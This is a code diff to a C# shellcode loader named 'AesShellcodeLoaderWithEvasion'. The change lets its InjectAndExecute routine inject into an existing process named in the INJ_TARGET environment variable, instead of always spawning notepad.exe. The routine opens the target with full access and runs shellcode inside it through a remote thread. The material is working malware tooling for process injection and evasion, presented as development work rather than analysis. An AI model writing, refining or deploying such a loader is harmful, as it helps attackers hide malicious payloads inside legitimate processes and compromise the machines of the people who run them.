@@ -154,8 +154,22 @@ namespace AesShellcodeLoaderWithEvasion
 
         static void InjectAndExecute(byte[] shellcode)
         {
-            Process targetProcess = Process.Start("notepad.exe");
-            targetProcess.WaitForInputIdle();
+            bool spawnedTarget = false;
+            Process targetProcess;
+            string envTarget = Environment.GetEnvironmentVariable("INJ_TARGET");
+            if (!string.IsNullOrEmpty(envTarget))
+            {
+                Process[] found = Process.GetProcessesByName(envTarget);
+                if (found.Length == 0) return;
+                targetProcess = found[0];
+            }
+            else
+            {
+                targetProcess = Process.Start("notepad.exe");
+                if (targetProcess == null) return;
+                targetProcess.WaitForInputIdle();
+                spawnedTarget = true;
+            }
 
             IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetProcess.Id);
             if (hProcess == IntPtr.Zero) return;
@@ -179,7 +193,7 @@ namespace AesShellcodeLoaderWithEvasion
 
             CloseHandle(hThread);
             CloseHandle(hProcess);
-            targetProcess.WaitForExit();
+            if (spawnedTarget) targetProcess.WaitForExit();
         }
     }
 }
